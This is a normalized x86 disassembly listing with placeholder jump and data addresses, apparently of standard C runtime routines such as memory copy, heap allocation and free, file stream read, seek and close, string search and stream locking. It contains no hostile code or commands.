movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
sub_438137
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_438127
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_43811c
pop ecx
sub_438158
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add ecx 0x9
push ecx
add eax 0x9
push eax
call sub_43b970
neg eax
pop ecx
sbb eax eax
pop ecx
inc eax
pop ebp
retn 0x4
sub_438178
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
jmp r-xdata
push [ ebp + 0x8 ]
call sub_438337
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call sub_43f309
pop ecx
test eax eax
je r-xdata
leave
retn
test [ rw-data ] 0x1
mov edi rw-data
mov esi r--data
jne r-xdata
push edi
lea ecx [ ebp - 0x10 ]
call sub_437d5f
push r--data
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] esi
call sub_43c3a5
int3
or [ rw-data ] 0x1
push 0x1
lea eax [ ebp - 0x4 ]
push eax
mov ecx edi
mov [ ebp - 0x4 ] r--data
call sub_437c2b
push sub_4549a3
mov [ rw-data ] esi
call sub_43ceb4
pop ecx
sub_4381f8
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
push esi
call sub_43c04c
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_43c00a
pop ecx
mov [ esi ] eax
pop esi
sub_438232
push 0xc
push r--data
call sub_43f8e0
xor edi edi
mov [ ebp - 0x1c ] edi
xor eax eax
mov ebx [ ebp + 0x8 ]
cmp ebx edi
setne al
cmp eax edi
jne r-xdata
xor eax eax
mov esi [ ebp + 0xc ]
cmp esi edi
setne al
cmp eax edi
je r-xdata
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
xor eax eax
cmp [ esi ] di
setne al
cmp eax edi
je r-xdata
call sub_43f925
retn
call sub_43f608
mov [ ebp + 0x8 ] eax
cmp eax edi
jne r-xdata
mov [ ebp - 0x4 ] edi
cmp [ ebx ] di
jne r-xdata
call sub_43c04c
mov [ eax ] 0x18
jmp r-xdata
push eax
push [ ebp + 0x10 ]
push esi
push ebx
call sub_43f34f
add esp 0x10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4382e6
mov eax [ ebp - 0x1c ]
call sub_43c04c
mov [ eax ] 0x16
push 0xfffffffe
lea eax [ ebp - 0x10 ]
push eax
push rw-data
call sub_43fad0
add esp 0xc
jmp r-xdata
xor eax eax
jmp r-xdata
sub_4382f0
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push 0x80
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_438232
add esp 0xc
mov [ esi ] eax
test eax eax
je r-xdata
call sub_43c04c
push 0x16
pop esi
mov [ eax ] esi
call sub_43f8c5
mov eax esi
jmp r-xdata
call sub_43c04c
mov eax [ eax ]
xor eax eax
jmp r-xdata
pop esi
pop ebp
retn
sub_438337
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx 0xffffffe0
ja r-xdata
push ebx
call sub_43f309
pop ecx
call sub_43c04c
mov [ eax ] 0xc
xor eax eax
push esi
push edi
test ebx ebx
je r-xdata
call sub_43fdf7
push 0x1e
call sub_43fc48
push 0xff
call sub_43b4aa
xor eax eax
inc eax
mov eax ebx
jmp r-xdata
mov eax edi
pop edi
pop esi
jmp r-xdata
push 0xc
pop esi
cmp [ rw-data ] eax
je r-xdata
push eax
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
pop ebx
pop ebp
retn
call sub_43c04c
mov [ eax ] esi
push ebx
call sub_43f309
pop ecx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
jmp r-xdata
call sub_43c04c
mov [ eax ] esi
sub_4383cb
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
mov [ ebp - 0x2c ] eax
call sub_43ffe0
push 0x8
pop ecx
mov [ ebp - 0x28 ] eax
xor eax eax
lea edi [ ebp - 0x24 ]
push 0x7
[ edi ]
pop edi
mov dl [ esi ]
movzx ecx dl
mov eax ecx
and ecx edi
mov bl 0x1
shl bl cl
shr eax 0x3
lea eax [ ebp + eax - 0x24 ]
or [ eax ] bl
inc esi
test dl dl
jne r-xdata
mov edx [ ebp - 0x2c ]
test edx edx
jne r-xdata
mov al [ edx ]
movzx esi al
xor ebx ebx
mov ecx esi
and ecx edi
inc ebx
shl ebx cl
shr esi 0x3
test [ ebp + esi - 0x24 ] bl
jne r-xdata
mov eax [ ebp - 0x28 ]
mov edx [ eax + 0x18 ]
jmp r-xdata
test al al
je r-xdata
mov ebx edx
jmp r-xdata
inc edx
cmp [ edx ] 0x0
jne r-xdata
movzx esi [ edx ]
xor eax eax
mov ecx esi
and ecx edi
inc eax
shl eax cl
shr esi 0x3
test [ ebp + esi - 0x24 ] al
jne r-xdata
jmp r-xdata
mov [ edx ] 0x0
inc edx
inc edx
mov eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x18 ] edx
mov eax ebx
sub eax edx
neg eax
sbb eax eax
pop edi
and eax ebx
pop esi
xor ecx ebp
pop ebx
call sub_437c1c
leave
retn
sub_438488
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
mov edi [ ebp + 0x10 ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] ebx
test edi edi
je r-xdata
xor eax eax
cmp [ ebp + 0x14 ] 0x0
je r-xdata
test ecx ecx
jne r-xdata
mov esi [ ebp + 0x18 ]
test esi esi
je r-xdata
call sub_43c04c
mov [ eax ] 0x16
cmp ebx 0xffffffff
je r-xdata
or eax 0xffffffff
xor edx edx
div edi
cmp [ ebp + 0x14 ] eax
jbe r-xdata
test esi esi
je r-xdata
push ebx
push 0x0
push ecx
call sub_43a820
add esp 0xc
imul edi [ ebp + 0x14 ]
test [ esi + 0xc ] 0x10c
mov [ ebp - 0x10 ] edi
mov ebx edi
je r-xdata
or eax 0xffffffff
xor edx edx
div edi
cmp [ ebp + 0x14 ] eax
ja r-xdata
mov [ ebp - 0xc ] 0x1000
mov eax [ esi + 0x18 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
jmp r-xdata
test [ esi + 0xc ] 0x10c
je r-xdata
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp ebx [ ebp - 0xc ]
jb r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push esi
call sub_4402a7
pop ecx
cmp eax 0xffffffff
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
js r-xdata
mov eax edi
sub eax ebx
xor edx edx
div [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax 0x7fffffff
cmp ebx eax
ja r-xdata
mov ecx 0x7fffffff
xor edx edx
cmp ebx ecx
jbe r-xdata
or [ esi + 0xc ] 0x20
mov edi ebx
cmp ebx eax
jb r-xdata
cmp [ ebp + 0xc ] 0xffffffff
je r-xdata
mov ecx [ ebp - 0x8 ]
inc [ ebp - 0x8 ]
mov [ ecx ] al
mov eax [ esi + 0x18 ]
dec ebx
dec [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
cmp eax [ ebp - 0x4 ]
ja r-xdata
mov eax ebx
mov eax ebx
div [ ebp - 0xc ]
mov eax ebx
mov eax ecx
div [ ebp - 0xc ]
mov eax ecx
jmp r-xdata
cmp edi [ ebp - 0x4 ]
ja r-xdata
mov edi eax
call sub_43c04c
mov [ eax ] 0x22
jmp r-xdata
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
call sub_43a820
add esp 0xc
push eax
push [ ebp - 0x8 ]
push esi
call sub_43917d
pop ecx
push eax
call sub_440980
add esp 0xc
test eax eax
je r-xdata
sub eax edx
jmp r-xdata
push edi
push [ esi ]
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
call sub_438acf
sub [ esi + 0x4 ] edi
add [ esi ] edi
add [ ebp - 0x8 ] edi
sub ebx edi
add esp 0x10
sub [ ebp - 0x4 ] edi
mov edi [ ebp - 0x10 ]
jmp r-xdata
call sub_43f8c5
or [ esi + 0xc ] 0x10
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
test ebx ebx
jne r-xdata
add [ ebp - 0x8 ] eax
sub ebx eax
sub [ ebp - 0x4 ] eax
jmp r-xdata
sub_438644
push 0xc
push r--data
call sub_43f8e0
xor esi esi
mov [ ebp - 0x1c ] esi
cmp [ ebp + 0x10 ] esi
je r-xdata
xor eax eax
cmp [ ebp + 0x14 ] esi
je r-xdata
cmp [ ebp + 0x18 ] esi
jne r-xdata
push [ ebp + 0x18 ]
call sub_43909f
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_438488
add esp 0x14
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4386c8
mov eax [ ebp - 0x1c ]
jmp r-xdata
cmp [ ebp + 0xc ] 0xffffffff
je r-xdata
call sub_43f925
retn
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
push [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
call sub_43a820
add esp 0xc
sub_4386ef
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push edi
mov edi [ ebp + 0x8 ]
xor ebx ebx
cmp edi ebx
jne r-xdata
push esi
push edi
call sub_43917d
mov esi eax
pop ecx
mov [ ebp - 0x8 ] esi
cmp [ edi + 0x4 ] ebx
jge r-xdata
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
or eax 0xffffffff
jmp r-xdata
push 0x1
push ebx
push esi
call sub_440d30
add esp 0xc
mov [ ebp - 0x4 ] eax
cmp eax ebx
jl r-xdata
mov [ edi + 0x4 ] ebx
pop edi
pop ebx
leave
retn
or eax 0xffffffff
jmp r-xdata
mov edx [ edi + 0xc ]
test edx 0x108
jne r-xdata
pop esi
mov eax [ edi ]
mov ecx [ edi + 0x8 ]
mov ebx eax
sub ebx ecx
mov [ ebp - 0xc ] ebx
test dl 0x3
je r-xdata
sub eax [ edi + 0x4 ]
jmp r-xdata
test dl dl
js r-xdata
mov edx esi
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
test [ edx + esi + 0x4 ] 0x80
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
call sub_43c04c
mov [ eax ] 0x16
jmp r-xdata
mov edx ecx
cmp edx eax
jae r-xdata
test [ edi + 0xc ] 0x1
je r-xdata
mov eax ebx
jmp r-xdata
mov esi eax
mov eax [ ebp - 0xc ]
add eax [ ebp - 0x4 ]
mov edx [ edi + 0x4 ]
test edx edx
jne r-xdata
inc edx
cmp edx esi
jb r-xdata
inc ebx
mov ebx [ ebp - 0x8 ]
mov esi [ ebp - 0x8 ]
sub eax ecx
add eax edx
sar ebx 0x5
and esi 0x1f
lea ebx [ ebx * 4 + rw-data ]
mov [ ebp + 0x8 ] eax
mov eax [ ebx ]
shl esi 0x6
test [ eax + esi + 0x4 ] 0x80
je r-xdata
and [ ebp - 0xc ] edx
jmp r-xdata
cmp [ edx ] 0xa
jne r-xdata
mov [ ebp - 0xc ] ebx
mov eax [ ebp + 0x8 ]
sub [ ebp - 0x4 ] eax
push 0x2
push 0x0
push [ ebp - 0x8 ]
call sub_440d30
add esp 0xc
cmp eax [ ebp - 0x4 ]
jne r-xdata
push 0x0
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
call sub_440d30
add esp 0xc
test eax eax
jns r-xdata
mov eax [ edi + 0x8 ]
mov ecx [ ebp + 0x8 ]
add ecx eax
jmp r-xdata
mov eax 0x200
cmp [ ebp + 0x8 ] eax
ja r-xdata
cmp eax ecx
jb r-xdata
mov eax [ edi + 0x18 ]
mov ecx [ edi + 0xc ]
test cl 0x8
je r-xdata
cmp [ eax ] 0xa
jne r-xdata
test [ edi + 0xc ] 0x2000
jmp r-xdata
inc [ ebp + 0x8 ]
test ecx 0x400
je r-xdata
inc eax
inc [ ebp + 0x8 ]
je r-xdata
mov [ ebp + 0x8 ] eax
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x4
sub_438883
push 0xc
push r--data
call sub_43f8e0
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
test eax eax
jne r-xdata
push [ ebp + 0x8 ]
call sub_43909f
pop ecx
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_4386ef
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4388de
mov eax [ ebp - 0x1c ]
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
or eax 0xffffffff
jmp r-xdata
call sub_43f925
retn
sub_4388e8
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
jne r-xdata
and eax 0xffffffef
cmp [ ebp + 0x10 ] 0x1
mov [ esi + 0xc ] eax
jne r-xdata
call sub_43c04c
mov [ eax ] 0x16
or eax 0xffffffff
jmp r-xdata
push esi
call sub_43bc19
mov eax [ esi + 0xc ]
pop ecx
test al al
jns r-xdata
push esi
call sub_4386ef
add [ ebp + 0xc ] eax
and [ ebp + 0x10 ] 0x0
pop ecx
pop esi
pop ebp
retn
test al 0x1
je r-xdata
and eax 0xfffffffc
mov [ esi + 0xc ] eax
jmp r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_43917d
pop ecx
push eax
call sub_440d30
xor ecx ecx
add esp 0xc
cmp eax 0xffffffff
setne cl
lea eax [ ecx - 0x1 ]
test al 0x8
je r-xdata
test eax 0x400
jne r-xdata
mov [ esi + 0x18 ] 0x200
sub_438972
push 0xc
push r--data
call sub_43f8e0
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
test eax eax
jne r-xdata
mov esi [ ebp + 0x10 ]
test esi esi
je r-xdata
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
or eax 0xffffffff
jmp r-xdata
push [ ebp + 0x8 ]
call sub_43909f
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4388e8
add esp 0xc
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4389e4
mov eax [ ebp - 0x1c ]
cmp esi 0x1
je r-xdata
call sub_43f925
retn
cmp esi 0x2
jne r-xdata
sub_4389ee
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
or edi 0xffffffff
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x83
je r-xdata
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
or eax edi
jmp r-xdata
and [ esi + 0xc ] 0x0
mov eax edi
push esi
call sub_43bc19
push esi
mov edi eax
call sub_440f64
push esi
call sub_43917d
push eax
call sub_440ea0
add esp 0x10
test eax eax
jns r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
or edi 0xffffffff
jmp r-xdata
push eax
call sub_4381f8
and [ esi + 0x1c ] 0x0
pop ecx
sub_438a5b
push 0xc
push r--data
call sub_43f8e0
or [ ebp - 0x1c ] 0xffffffff
xor eax eax
mov esi [ ebp + 0x8 ]
test esi esi
setne al
test eax eax
jne r-xdata
test [ esi + 0xc ] 0x40
je r-xdata
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
or eax 0xffffffff
jmp r-xdata
push esi
call sub_43909f
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_4389ee
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_438ac7
jmp r-xdata
and [ esi + 0xc ] 0x0
call sub_43f925
retn
mov eax [ ebp - 0x1c ]
sub_438acf
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x14 ]
test esi esi
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
call sub_43c04c
push 0x16
pop esi
mov [ eax ] esi
pop esi
pop ebp
retn
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
call sub_43a820
add esp 0xc
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] esi
jb r-xdata
cmp [ ebp + 0xc ] esi
jae r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_43a8a0
add esp 0xc
jmp r-xdata
push 0x16
pop eax
call sub_43c04c
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
call sub_43f8c5
mov eax esi
jmp r-xdata
sub_438b44
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push esi
test eax eax
je r-xdata
xor eax eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
call sub_43c04c
push 0x16
pop esi
mov [ eax ] esi
cmp [ ebp + 0xc ] eax
jae r-xdata
pop esi
pop ebp
retn
push eax
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_437db0
add esp 0xc
call sub_43c04c
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
call sub_43f8c5
mov eax esi
jmp r-xdata
sub_438b97
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x14 ]
push eax
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_441e60
add esp 0x14
pop ebp
retn
sub_438bc0
mov eax [ esp + 0xc ]
push ebx
test eax eax
je r-xdata
pop ebx
retn
mov edx [ esp + 0x8 ]
xor ebx ebx
mov bl [ esp + 0xc ]
test edx 0x3
je r-xdata
sub eax 0x4
jb r-xdata
mov cl [ edx ]
add edx 0x1
xor cl bl
je r-xdata
add eax 0x4
je r-xdata
push edi
mov edi ebx
shl ebx 0x8
add ebx edi
mov edi ebx
shl ebx 0x10
add ebx edi
jmp r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
sub eax 0x1
je r-xdata
mov cl [ edx ]
add edx 0x1
xor cl bl
je r-xdata
mov ecx [ edx ]
xor ecx ebx
mov edi 0x7efefeff
add edi ecx
xor ecx 0xffffffff
xor ecx edi
add edx 0x4
and ecx 0x81010100
je r-xdata
test edx 0x3
jne r-xdata
sub eax 0x1
jne r-xdata
sub eax 0x4
jb r-xdata
mov ecx [ edx - 0x4 ]
xor cl bl
je r-xdata
pop edi
lea eax [ edx - 0x4 ]
pop edi
pop ebx
retn
xor ch bl
je r-xdata
lea eax [ edx - 0x3 ]
pop edi
pop ebx
retn
shr ecx 0x10
xor cl bl
je r-xdata
lea eax [ edx - 0x2 ]
pop edi
pop ebx
retn
xor ch bl
je r-xdata
pop edi
jmp r-xdata
sub_438ca0
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
lea ecx [ ecx ]
add edx 0x1
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
add ecx 0x1
mov al [ esi ]
or al al
je r-xdata
sub_438ce6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi + 0xc ] 0x0
test eax eax
jne r-xdata
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
call sub_43ffe0
mov [ esi + 0x8 ] eax
mov ecx [ eax + 0x6c ]
mov [ esi ] ecx
mov ecx [ eax + 0x68 ]
mov [ esi + 0x4 ] ecx
mov ecx [ esi ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_442197
mov [ esi ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
or [ eax + 0x70 ] 0x2
mov [ esi + 0xc ] 0x1
jmp r-xdata
call sub_442433
mov [ esi + 0x4 ] eax
sub_438d6d
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_438ce6
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
push edi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] 0x0
push esi
jne r-xdata
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
movzx eax [ ebx ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_4428f4
movzx esi ax
movzx eax [ edi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
add ebx 0x2
call sub_4428f4
add esp 0x10
add edi 0x2
movzx eax ax
test si si
je r-xdata
sub ebx edi
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
movzx ecx ax
movzx eax si
sub eax ecx
cmp [ ebp - 0x4 ] 0x0
pop esi
je r-xdata
cmp si ax
je r-xdata
mov esi eax
cmp eax 0x5a
ja r-xdata
pop edi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
add edi 0x2
test si si
je r-xdata
cmp eax 0x5a
ja r-xdata
add eax 0x20
movzx esi ax
jmp r-xdata
cmp si ax
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ edi ]
cmp eax 0x41
jb r-xdata
movzx eax [ ebx + edi ]
cmp eax 0x41
jb r-xdata
jmp r-xdata
sub_438e70
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
push esi
jne r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_438d6d
add esp 0xc
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
mov eax 0x7fffffff
jmp r-xdata
sub esi ecx
pop esi
pop ebp
retn
mov edx eax
cmp eax 0x5a
ja r-xdata
add ecx 0x2
test dx dx
je r-xdata
cmp eax 0x5a
ja r-xdata
add eax 0x20
movzx edx ax
jmp r-xdata
movzx ecx ax
movzx eax dx
sub eax ecx
jmp r-xdata
cmp dx ax
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ ecx ]
cmp eax 0x41
jb r-xdata
movzx eax [ esi + ecx ]
cmp eax 0x41
jb r-xdata
sub_438efb
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x14 ]
test esi esi
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
call sub_43c04c
push 0x16
pop esi
mov [ eax ] esi
pop esi
pop ebp
retn
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
call sub_406770
add esp 0xc
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] esi
jb r-xdata
cmp [ ebp + 0xc ] esi
jae r-xdata
lea eax [ esi + esi ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_43a8a0
add esp 0xc
jmp r-xdata
push 0x16
pop eax
call sub_43c04c
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
call sub_43f8c5
mov eax esi
jmp r-xdata
sub_438f73
mov edi edi
push ebp
mov ebp esp
push ebx
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push esi
push edi
push [ ebp + 0x8 ]
call sub_442a37
lea esi [ eax + 0x1 ]
push 0x2
push esi
call sub_4429f7
mov edi eax
add esp 0xc
cmp edi ebx
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
push [ ebp + 0x8 ]
push esi
push edi
call sub_442994
add esp 0xc
test eax eax
jne r-xdata
pop ebx
pop ebp
retn
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_43f873
mov eax edi
jmp r-xdata
pop edi
pop esi
sub_438fce
mov eax [ rw-data ]
push esi
push 0x14
pop esi
test eax eax
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_43de17
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor edx edx
mov ecx rw-data
jmp r-xdata
push 0x4
push esi
mov [ rw-data ] esi
call sub_43de17
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov [ edx + eax ] ecx
add ecx 0x20
add edx 0x4
cmp ecx rw-data
jl r-xdata
push 0x1a
pop eax
pop esi
retn
mov eax [ rw-data ]
push 0xfffffffe
pop esi
xor edx edx
mov ecx rw-data
push edi
mov [ ecx ] esi
cmp eax esi
je r-xdata
mov eax edx
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
mov edi edx
and edi 0x1f
shl edi 0x6
mov eax [ edi + eax ]
cmp eax 0xffffffff
je r-xdata
pop edi
xor eax eax
pop esi
retn
test eax eax
jne r-xdata
add ecx 0x20
inc edx
cmp ecx rw-data
jl r-xdata
sub_43909f
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax rw-data
cmp esi eax
jb r-xdata
add esi 0x20
push esi
call [ EnterCriticalSection@IAT ]
cmp esi rw-data
ja r-xdata
mov ecx esi
sub ecx eax
sar ecx 0x5
add ecx 0x10
push ecx
call sub_442c68
or [ esi + 0xc ] 0x8000
pop ecx
jmp r-xdata
pop esi
pop ebp
retn
sub_4390e0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x14
jge r-xdata
mov eax [ ebp + 0xc ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
pop ebp
retn
add eax 0x10
push eax
call sub_442c68
mov eax [ ebp + 0xc ]
or [ eax + 0xc ] 0x8000
pop ecx
pop ebp
retn
sub_439112
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
cmp eax rw-data
ja r-xdata
and [ eax + 0xc ] 0xffff7fff
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_442b8f
pop ecx
pop ebp
retn
sub_43914e
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
cmp ecx 0x14
jge r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
and [ eax + 0xc ] 0xffff7fff
add ecx 0x10
push ecx
call sub_442b8f
pop ecx
pop ebp
retn
sub_43917d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ eax + 0x10 ]
